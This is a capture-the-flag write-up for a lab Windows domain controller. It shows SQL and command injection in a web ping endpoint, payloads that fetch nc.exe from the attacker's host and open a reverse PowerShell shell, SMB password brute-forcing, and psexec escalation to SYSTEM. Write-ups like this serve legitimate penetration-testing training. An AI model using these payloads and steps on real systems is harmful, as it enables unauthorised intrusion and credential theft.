@@ -1,0 +1,418 @@
+Hack The Hill(MEDIUM)
+
+NMAP RESULTS:
+
+
+Completed NSE at 04:02, 5.15s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 04:02
+Completed NSE at 04:02, 0.00s elapsed
+Nmap scan report for 10.10.123.18
+Host is up, received syn-ack (0.17s latency).
+Scanned at 2021-02-21 04:00:20 EST for 142s
+
+PORT      STATE SERVICE       REASON  VERSION
+80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: PhotoStore - Home
+81/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Network Monitor
+82/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+|_http-favicon: Unknown favicon MD5: C967A141ABFF1D6AB42CE7440E58128C
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-02-21 09:00:29Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack
+3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: TROY
+|   NetBIOS_Domain_Name: TROY
+|   NetBIOS_Computer_Name: TROY-DC
+|   DNS_Domain_Name: troy.thm
+|   DNS_Computer_Name: TROY-DC.troy.thm
+|   DNS_Tree_Name: troy.thm
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-02-21T09:02:00+00:00
+| ssl-cert: Subject: commonName=TROY-DC.troy.thm
+| Issuer: commonName=TROY-DC.troy.thm
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-02-18T18:07:12
+| Not valid after:  2021-08-20T18:07:12
+| MD5:   8e67 fa98 7f40 991c 79cc a465 5902 3116
+| SHA-1: 8549 0631 3521 7816 0617 2735 504b c917 6312 d8a2
+| -----BEGIN CERTIFICATE-----
+| MIIC5DCCAcygAwIBAgIQP0CtA+cX5JtOWJIdmwhZpTANBgkqhkiG9w0BAQsFADAb
+| MRkwFwYDVQQDExBUUk9ZLURDLnRyb3kudGhtMB4XDTIxMDIxODE4MDcxMloXDTIx
+| MDgyMDE4MDcxMlowGzEZMBcGA1UEAxMQVFJPWS1EQy50cm95LnRobTCCASIwDQYJ
+| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKcy0y5/Zy9dYWkl7I4k+S5NfDJGycjK
+| 2zTTdmUJ+UmcUe4VZvG1GAy85okWk2lv51unzUKsm6fqdVNhz/ATjCtfHjhK3V+t
+| NRjK77z3Tg+t5lR385Y+lAG7+AkJrnbl2NImW89EP66s9TMjBs++UUyAHmO5jSy2
+| 178v3eKPEblMmdqRjR4eeYUFE5qf4rHyOoNtJ5pIsPbFqI4hbY5YxbD1IkTjBR3E
+| /G5A1VVqEigbpXPmD1BIaK6+Y7/j1Y9a2HZS5gPZxeU5m9Q97Ks9Yotv3VoRVEOf
+| MCSezx3ugn4h0PHe/KvVV15Y+rSCJCCe0spzbMcUsWP0Xf/RP1tx+YkCAwEAAaMk
+| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
+| CwUAA4IBAQB+l3DFShC64JVdlgOGB65AL66C7if6vf/RLrUYocQQcQ2lvRRl1qEF
+| OtpmBmQlqC43gBseFbhD459yzwWHbAmmOyCo3aB5eFqzUTNVf/vAYOg6oLEiSSdt
+| pgg4TjZS8pB7tUT/trRAwXrsgRiVpeaK/m8Kno8OFnCXxPaSWsPZN2mugSeNIlX5
+| 6Vl64HOq50MEOEkJkpma2P8BqYborBSLC/z8AB64Wh63VG0H2uS0QxAKOt74m1hN
+| bfhoIYl9sPRf2uzRYHe71cWEftp1HP+UDM5ShxsuB0/DQld5sVv0C6gGdX4MvVeB
+| Glm+cWFhZqKyelsvj5lXBls/ZsUJV51v
+|_-----END CERTIFICATE-----
+|_ssl-date: 2021-02-21T09:02:39+00:00; +1s from scanner time.
+7680/tcp  open  pando-pub?    syn-ack
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+9999/tcp  open  abyss?        syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sun, 21 Feb 2021 09:00:33 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sun, 21 Feb 2021 09:00:31 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Sun, 21 Feb 2021 09:00:32 GMT
+|_    Content-Length: 0
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.91%I=7%D=2/21%Time=6032212E%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x2020
+SF:21\x2009:00:31\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
+SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x202021\x2009:0
+SF:0:32\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
+SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x202021\x2009:00:33
+SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
+SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
+SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
+SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
+SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
+SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
+Service Info: Host: TROY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 20763/tcp): CLEAN (Timeout)
+|   Check 2 (port 14851/tcp): CLEAN (Timeout)
+|   Check 3 (port 57550/udp): CLEAN (Timeout)
+|   Check 4 (port 26189/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-02-21T09:02:00
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+
+
+on port 81, i found the script.js which reveals the source code of the ping program:
+$('.ping').click(function(){
+    let id = $(this).attr('data-id');
+    $('textarea[name="result"]').val('');
+    $.getJSON('/ping?id=' + id, function(resp){
+        $('textarea[name="result"]').val( resp.result );
+        $('#pingresult').modal('show');
+    }).fail(function(x){
+        alert(x.responseJSON[0]);
+    })
+});
+
+as we can see that '/ping?id=' which can be used for arbitrary remote code execution?
+
+maybe this parameter is vuln to sql injection?
+
+when i tried to give the get request as:
+http://10.10.110.26:81/ping?id=1
+
+the result is :
+{
+  "result": "\nPinging 127.0.0.1 with 32 bytes of data:\nReply from 127.0.0.1: bytes=32 time<1ms TTL=128\nReply from 127.0.0.1: bytes=32 time<1ms TTL=128\nReply from 127.0.0.1: bytes=32 time<1ms TTL=128\nReply from 127.0.0.1: bytes=32 time<1ms TTL=128\n\nPing statistics for 127.0.0.1:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n"
+}
+
+
+sqlmap -r sql --tamper=space2comment --level=4 --risk=3
+sqlmap identified the following injection point(s) with a total of 250 HTTP(s) requests:
+---
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 4985=4985
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 1588 FROM (SELECT(SLEEP(5)))uISL)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-6668 UNION ALL SELECT NULL,CONCAT(0x7176787a71,0x587048416961475450527169577064694c4155445a436d6f4350626a524762745a41524357494c77,0x71787a7a71)-- -
+
+
+YES!! IT IS VULNERABLE TO SQL INJECTION
+
+so i can send an sql payload and check whether it working or not
+
+in burp i send this request:
+GET /ping?id=1000+union+select+10,'|+ping+10.8.73.218'+--+- HTTP/1.1
+
+i setup a tcpdump to check the packets transfer:
+┌──(kali㉿kali)-[/usr/share/seclists/Web-Shells/FuzzDB]
+└─$ sudo tcpdump -i tun0 icmp
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+01:14:59.196014 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 13, length 40
+01:14:59.196028 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 13, length 40
+01:15:00.205225 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 14, length 40
+01:15:00.205239 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 14, length 40
+01:15:01.221756 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 15, length 40
+01:15:01.221770 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 15, length 40
+c01:15:02.237178 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 16, length 40
+01:15:02.237197 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 16, length 40
+^C
+8 packets captured
+
+
+IT WORKS, MEANS WE HAVE CODE EXECUTION
+i upload the netcat on the remote machine by using this payload:
+
+GET /ping?id=1000+union+select+10,'|+powershell+curl+10.8.73.218/nc.exe+-o+nc.exe'+--+- 
+
+then i check my python server logs for verification that my file has been uploaded:
+
+┌──(kali㉿kali)-[/usr/share/seclists/Web-Shells/FuzzDB]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.5.244 - - [03/Mar/2021 01:20:24] "GET /nc.exe HTTP/1.1" 200 -
+
+now using netcat i will try to make a reverse shell:
+
+GET /ping?id=1000+union+select+10,'|+nc.exe+10.8.73.218+1234+-e+powershell'+--+- HTTP/1.1
+
+lets listen:
+┌──(kali㉿kali)-[/usr/share/seclists/Web-Shells/FuzzDB]
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.5.244] 49812
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\helen\Desktop\WebApp\h1-tryhackme-medium-two-main\public> 
+
+YES WE ARE IN!!
+
+GOT IN AS HELEN USER:
+PS C:\Users\helen\Desktop> cat flag.txt 
+cat flag.txt
+THM{REDACTED}
+PS C:\Users\helen\Desktop> 
+GOT THE FIRST FLAG
+
+no on port 80, the photo store 
+
+when i create an account, it filters my input , so in the console tab i block the script.js file and then create a user
+in the /profile directory i use this payload:
+
+admin | ping 10.8.73.218 
+then i check the tcpdump:
+
+┌──(kali㉿kali)-[/usr/share/seclists/Web-Shells/FuzzDB]
+└─$ sudo tcpdump -i tun0 icmp
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+01:42:10.185560 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 21, length 40
+01:42:10.185573 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 21, length 40
+01:42:11.188871 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 22, length 40
+01:42:11.188885 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 22, length 40
+01:42:12.204315 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 23, length 40
+01:42:12.204331 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 23, length 40
+01:42:13.220173 IP 10.10.5.244 > 10.8.73.218: ICMP echo request, id 1, seq 24, length 40
+01:42:13.220210 IP 10.8.73.218 > 10.10.5.244: ICMP echo reply, id 1, seq 24, length 40
+
+it respond back!
+so like previous one , first upload nc.exe then execute it and get a reverse shell
+
+AND WE GOT A SHELL:
+
+┌──(kali㉿kali)-[/usr/share/seclists/Web-Shells/FuzzDB]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.5.244] 49903
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\agamemnon\Desktop\WebApp\public> 
+PS C:\Users\agamemnon\Desktop\WebApp\public> whoami
+whoami
+troy\agamemnon
+
+
+GOT THE SECOND FLAG:
+
+PS C:\Users\agamemnon\Desktop> cat flag.txt
+cat flag.txt
+THM{REDACTED}
+PS C:\Users\agamemnon\Desktop> 
+
+now , as we know all the usernames, we can use crackmapexec for bruteforcing the passwords(for smb shares)
+so lets save the names in a file
+
+achilles
+hector
+Helen
+Patrocles
+Agamemnon
+
+achilles user is from admin group:
+
+PS C:\Users\agamemnon\Desktop\WebApp\public> net user achilles
+net user achilles
+User name                    achilles
+Full Name                    Achilles
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            19/02/2021 18:32:09
+Password expires             Never
+Password changeable          19/02/2021 18:32:09
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   19/02/2021 18:52:12
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       
+Global Group memberships     *Domain Users         
+The command completed successfully.
+
+SMB         10.10.62.194    445    TROY-DC          [-] troy.thm\achilles:system STATUS_LOGON_FAILURE 
+SMB         10.10.62.194    445    TROY-DC          [-] troy.thm\achilles:candyfloss STATUS_LOGON_FAILURE 
+SMB         10.10.62.194    445    TROY-DC          [-] troy.thm\achilles:alondra STATUS_LOGON_FAILURE 
+SMB         10.10.62.194    445    TROY-DC          [+] troy.thm\achilles:winniethepooh (Pwn3d!)
+
+GOT THE ACHILLES PASSWORD
+LETS USE evil-winrm or psexec to get into the system
+
+using evil-winrm, i am not able to get admin rights:
+┌──(kali㉿kali)-[~]
+└─$ sudo evil-winrm -i 10.10.62.194 -u achilles -p winniethepooh
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\achilles\Documents> whoami
+troy\achilles
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\achilles\Documents> 
+
+GOT THE THIRD FLAG:
+
+c[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\achilles\Desktop> cat flag.txt
+THM{REDACTED}
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\achilles\Desktop> 
+
+BUT USING PSEXEC WE ARE ADMIN!!
+
+┌──(kali㉿kali)-[~]
+└─$ psexec.py TROY.thm/achilles:winniethepooh@10.10.62.194                                                                                                          1 ⨯
+Impacket v0.9.23.dev1+20210212.143925.3f3002e1 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.62.194.....
+[*] Found writable share ADMIN$
+[*] Uploading file iwZZRZkd.exe
+[*] Opening SVCManager on 10.10.62.194.....
+[*] Creating service PFHW on 10.10.62.194.....
+[*] Starting service PFHW.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1757]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
+
+GOT THE FOUTH FLAG:
+C:\Users\hector\Desktop>type flag.txt 
+THM{REDACTED}
+C:\Users\hector\Desktop>
+
+GOT THE FIFTH FLAG:
+C:\Users\patrocles\Desktop>type flag.txt
+THM{REDACTED}
+C:\Users\patrocles\Desktop>
+
+GOT THE SIXTH FLAG:
+C:\Users\Administrator\Desktop>type flag.txt
+THM{REDECTED}
+C:\Users\Administrator\Desktop>
+
+
+
+
+
